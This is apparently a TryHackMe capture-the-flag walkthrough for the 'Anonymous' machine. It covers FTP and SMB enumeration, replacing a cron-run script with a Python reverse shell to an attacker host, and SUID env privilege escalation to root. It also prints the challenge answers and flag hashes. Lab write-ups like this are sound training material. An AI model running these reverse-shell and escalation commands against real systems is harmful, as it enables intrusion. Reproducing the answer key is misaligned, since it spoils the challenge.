# Anonymous — TryHackMe Walkthrough

<img width="1906" height="365" alt="Screenshot 2026-01-15 181017" src="https://github.com/user-attachments/assets/deedd4d9-a04d-4e96-a567-dbf0ac280d99" />

---

## Recon / Enumeration

After the machine boots, the first step is port scanning.

```
nmap -sV <TARGET-IP>
```

<img width="905" height="318" alt="Screenshot 2026-01-15 152140" src="https://github.com/user-attachments/assets/1165babd-efc4-49bd-85ad-39e76a45b44c" />

### Challenge Questions & Answers

**Q. Enumerate the machine. How many ports are open?**
4

**Q. What service is running on port 21?**
ftp

**Q. What service is running on ports 139 and 445?**
smb

---

## FTP Enumeration

I checked FTP access using anonymous login, and it succeeded.


<img width="948" height="737" alt="Screenshot 2026-01-15 152507" src="https://github.com/user-attachments/assets/eafe335d-7fe8-4909-8942-ce5cf6ecc0ff" />


Inside the FTP server, there was a folder named `scripts` containing three files. I downloaded all of them to my machine for analysis.

Among them was a **bash script**, which looked like it was being executed automatically (likely via cron), and a **log file**, which confirmed periodic execution.


---

## SMB Enumeration

Next, I enumerated SMB services.

```
enum4linux -a <TARGET-IP>
```


<img width="897" height="540" alt="Screenshot 2026-01-15 155216" src="https://github.com/user-attachments/assets/bb3ba6c7-5261-4211-b182-d7b8dfad6a36" />


(Alternatively, this can also be done using `smbclient -L //<ip> -N`.)

From enumeration, I discovered an SMB share.

**Q. There's a share on the user's computer. What's it called?**
`pics`

I also identified a user named **namelessone**.

I accessed the `pics` share and found two image files. I tried basic steganography techniques on them but found nothing useful. At this point, the goal was to gain access as `namelessone`.

---

## Exploitation — Reverse Shell via FTP Script

From the FTP enumeration earlier, I already had a bash script named `clean.sh`. Since it appeared to be executed automatically, I modified its contents and added a reverse shell payload.

### Modified Script Payload

```
python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("ATTACKER_IP_ADDRESS",PORT_NUMBER));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"])'
```

After editing the script, I uploaded it back to the FTP server.


<img width="625" height="419" alt="Screenshot 2026-01-15 182501" src="https://github.com/user-attachments/assets/b3fdefe2-1b9c-47ed-9b54-9617732c865c" />


At the same time, I started a Netcat listener on my machine.

As soon as the script executed, I received a reverse shell.


<img width="588" height="343" alt="Screenshot 2026-01-15 160824" src="https://github.com/user-attachments/assets/83431b95-ae6b-457d-b353-faceed5f4ab4" />


I upgraded the shell for better interaction:

```
python3 -c 'import pty; pty.spawn("/bin/bash")'
```

Now logged in as the user, I read the user flag.


<img width="350" height="159" alt="Screenshot 2026-01-15 160916" src="https://github.com/user-attachments/assets/b43d162c-2b48-4812-9997-dd29cf8e0f41" />


**Q. user.txt**
`90d6f992585815ff991e68748c414740`

---

## Privilege Escalation

I first checked sudo permissions, but nothing useful was found.

Next, I searched for SUID binaries:

```
find / -perm -4000 -type f 2>/dev/null
```


<img width="537" height="647" alt="Screenshot 2026-01-15 161115" src="https://github.com/user-attachments/assets/a9076f80-e971-4a94-8270-91a54a6b241e" />


Among the results, I noticed `/usr/bin/env`, which is exploitable.

Checking GTFOBins confirmed a privilege escalation method.


<img width="1035" height="367" alt="Screenshot 2026-01-15 161632" src="https://github.com/user-attachments/assets/2577387b-f928-42aa-a725-4cfae9a4a267" />


---

## Root Access and Flag

I ran:

```
/usr/bin/env /bin/sh -p
```

This spawned a root shell.


<img width="432" height="108" alt="Screenshot 2026-01-15 161621" src="https://github.com/user-attachments/assets/f6b3c387-8542-4545-8a79-bf0f5e248e8b" />


With root access, retrieving the final flag was straightforward.


<img width="337" height="165" alt="Screenshot 2026-01-15 161739" src="https://github.com/user-attachments/assets/162c6d12-269c-4edd-89ed-0bd1bae282a9" />


**Q. root.txt**
`4d930091c31a622a7ed10f27999af363`



Challenge solved.

With careful enumeration and a bit of persistence, the machine finally gave in — user to root, flags secured, challenge completed successfully.
